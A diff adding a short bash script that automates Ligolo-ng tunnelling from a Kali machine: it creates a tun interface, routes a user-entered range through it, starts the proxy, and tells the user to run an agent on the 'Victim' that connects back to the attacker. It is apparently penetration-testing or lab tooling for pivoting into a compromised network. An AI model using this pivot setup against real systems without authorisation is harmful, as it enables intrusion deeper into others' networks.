@@ -1,0 +1,22 @@
+#!/bin/bash
+echo "=========Using Ligolo-ng to Tunnel traffic from Victim========="
+echo "=========Adding Ligolo interface to kali========="
+sudo ip tuntap add user kali mode tun ligolo
+echo "=========Enabling the Ligolo interface========="
+sudo ip link set ligolo up
+echo "=========New IP Configurations========="
+ifconfig ligolo
+ifconfig tun0 
+echo -e "\n"
+read -p "Enter IP Range like X.X.X.X/24 for adding to route table: " IP_range
+echo "$IP_range"
+echo "=========Adding range to Route Table========="
+sudo ip route add $IP_range dev ligolo
+echo "=========Printing Route Table========="
+ip route list
+echo "+=====================================+"
+echo "Download agent from 'https://github.com/nicocha30/ligolo-ng/releases'"
+echo "Finally use this command on Target, 'agent.exe -connect ip:11601 -ignore-cert"
+
+echo "Use session and start"
+sudo /opt/./proxy -selfcert
